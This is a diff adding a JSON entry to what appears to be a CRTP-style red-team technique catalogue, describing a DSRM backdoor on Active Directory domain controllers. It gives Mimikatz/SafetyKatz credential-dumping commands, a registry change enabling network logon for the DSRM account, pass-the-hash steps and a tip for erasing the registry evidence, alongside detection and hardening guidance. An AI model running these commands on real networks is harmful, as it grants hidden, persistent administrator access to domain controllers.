@@ -1,0 +1,103 @@
+{
+  "id": "crtp-dsrm-backdoor",
+  "name": "DSRM Backdoor (DC Local Admin Persistence)",
+  "command": "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD",
+  "description": "Enable DSRM administrator account for network logon on a DC. This local admin account is not in AD — its hash doesn't change with AD password resets.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Persistence",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "quiet",
+  "mitre": [
+    "T1098",
+    "T1003.002"
+  ],
+  "tools": [
+    "SafetyKatz"
+  ],
+  "tags": [
+    "dsrm",
+    "backdoor",
+    "persistence",
+    "local-admin",
+    "dc",
+    "registry"
+  ],
+  "steps": [
+    {
+      "label": "Dump DSRM hash on DC",
+      "command": "SafetyKatz.exe \"lsadump::lsa /patch\" \"exit\""
+    },
+    {
+      "label": "Enable DSRM network logon (run on DC)",
+      "command": "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD"
+    },
+    {
+      "label": "PTH with DSRM hash to DC",
+      "command": "SafetyKatz.exe \"sekurlsa::pth /domain:<dc_host> /user:Administrator /ntlm:<nt_hash> /run:powershell.exe\" \"exit\""
+    }
+  ],
+  "examples": [
+    {
+      "label": "Dump DSRM hash remotely",
+      "command": "Invoke-Command -ComputerName <dc_host> -ScriptBlock {Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"'}"
+    },
+    {
+      "label": "Enable registry key on DC",
+      "command": "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD"
+    },
+    {
+      "label": "Access DC with DSRM hash (PTH)",
+      "command": "Invoke-Mimikatz -Command '\"sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:<nt_hash> /run:powershell.exe\"'"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-golden-ticket",
+      "note": "Golden ticket for complementary persistence",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-acl-persistence",
+      "note": "ACL persistence survives password changes",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-skeleton-key",
+      "note": "Skeleton key as alternative DC backdoor",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-silver-ticket",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "notes": "DSRM hash doesn't change with AD password resets. Registry value 2 persists across reboots. Detectable via registry monitoring at HKLM\\System\\...\\Lsa.",
+  "references": [
+    {
+      "title": "CRTP - DSRM Backdoor",
+      "url": "https://www.alteredsecurity.com/adlab"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Every DC has a local Directory Services Restore Mode (DSRM) administrator account, used for offline AD recovery. The DSRM account's password is set during DC promotion and rarely changed. By default, the DSRM account cannot log on remotely. However, by setting DsrmAdminLogonBehavior = 2 in the registry, the DSRM account becomes a local admin that can authenticate remotely via NTLM (not Kerberos) — creating a local admin backdoor on every DC that survives the DC's AD domain role.",
+    "prerequisites": "Domain Admin rights on the DC. Ability to modify HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior. Knowledge of or ability to reset the DSRM password (ntdsutil).",
+    "impact": "T1098 Account Manipulation + T1003.002 OS Credential Dumping: Security Account Manager. Persistent local admin backdoor on all DCs using NTLM. Survives domain password resets. The DSRM hash can be Pass-the-Hashed to authenticate to the DC as local Administrator.",
+    "detection": "Registry modification event: Sysmon Event 13 (registry key value set) on HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior with value 2. Event 4657 (registry object modified) if object access auditing enabled. Event 4624 type 3 on DC using NTLM for local DSRM account (SAM account, not domain account). MDI: unusual local account NTLM logon to DC.\nAccount attribute changes (password set, group membership, servicePrincipalName, logon hours) correlated with unusual process lineage or timing (DET0096/AN0265).\nUse of usermod, passwd, groupmod on Linux to escalate permissions or persist access on existing users (AN0266).\nModifications to user accounts via dscl, pwpolicy, or sysadminctl on macOS that alter groups, enable root, or bypass MDM (AN0267).\nModifications to SSO/SAML user attributes (isAdmin, role, MFA bypass) through CLI, API, or rogue IdP apps (AN0268).\nAddition of new users or role permission changes via API or vSphere Client from non-jumpbox IPs (AN0269).",
+    "artifacts": "Sysmon Event 13: DsrmAdminLogonBehavior set to 2 on DC | Event 4624 type 3 on DC with NTLM auth for local admin account | Event 4657: Lsa registry key modified | MDI: local account authentication to DC",
+    "prevention": "Ensure DsrmAdminLogonBehavior = 0 (or absent) on all DCs via GPO: Computer Config → Preferences → Windows Settings → Registry → enforce HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior = 0. Monitor for value = 2 (Sysmon + SIEM). Rotate DSRM password regularly via ntdsutil. MDI deployment.\nDisable or Remove Feature or Program: Remove unnecessary authentication/authorization mechanisms.\nMulti-factor Authentication: Use MFA for all user and privileged accounts.\nNetwork Segmentation: Configure firewalls to limit access to critical systems and domain controllers; use VPCs in cloud environments.\nOperating System Configuration: Protect DCs with security config limiting SMB and other unnecessary protocols.\nPrivileged Account Management: Do not use domain admin accounts for day-to-day operations on unprivileged systems.\nRestrict File and Directory Permissions: Restrict access to files dealing with authentication/authorization.\nUser Account Management: Ensure low-privileged users cannot modify accounts or account-related policies.",
+    "evasion": "Set DsrmAdminLogonBehavior = 2 on the DC, use the DSRM hash for PtH, then reset to 0 to remove the registry evidence — authentication logs remain on the DC but the enabling condition is gone.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1098/",
+      "https://attack.mitre.org/techniques/T1003/002/"
+    ],
+    "misconfiguration": "DsrmAdminLogonBehavior left at 2 from a previous admin action. DSRM password never rotated (same since DC promotion). No Sysmon rule monitoring Lsa registry key. MDI not deployed on DCs.",
+    "vulnerable_config": "# DsrmAdminLogonBehavior = 2 (remote NTLM logon enabled for DSRM account):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').DsrmAdminLogonBehavior\n# Returns 2 = DSRM account usable for remote PtH to DC = CRITICAL\n\n# DSRM hash extractable via:\n# Invoke-Mimikatz -Command 'lsadump::sam' -ComputerName DC01\n# Then PtH: Invoke-Mimikatz -Command 'sekurlsa::pth /user:Administrator /domain:DC01 /ntlm:<dsrm-hash>'",
+    "secure_config": "# Ensure DsrmAdminLogonBehavior = 0 on all DCs via GPO preferences:\n# Computer Config → Preferences → Windows Settings → Registry → New Registry Item:\n# Hive: HKEY_LOCAL_MACHINE\n# Key: SYSTEM\\CurrentControlSet\\Control\\Lsa\n# Value name: DsrmAdminLogonBehavior\n# Value type: REG_DWORD\n# Value data: 0\n\n# PowerShell (run on each DC):\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior -Value 0\n\n# Rotate DSRM password on all DCs:\nntdsutil 'set dsrm password' 'reset password on server DC01' quit quit\n\n# SIEM/Sysmon alert:\n# Sysmon Event 13: TargetObject contains 'DsrmAdminLogonBehavior' AND Details = 'DWORD (0x00000002)' → CRITICAL"
+  }
+}
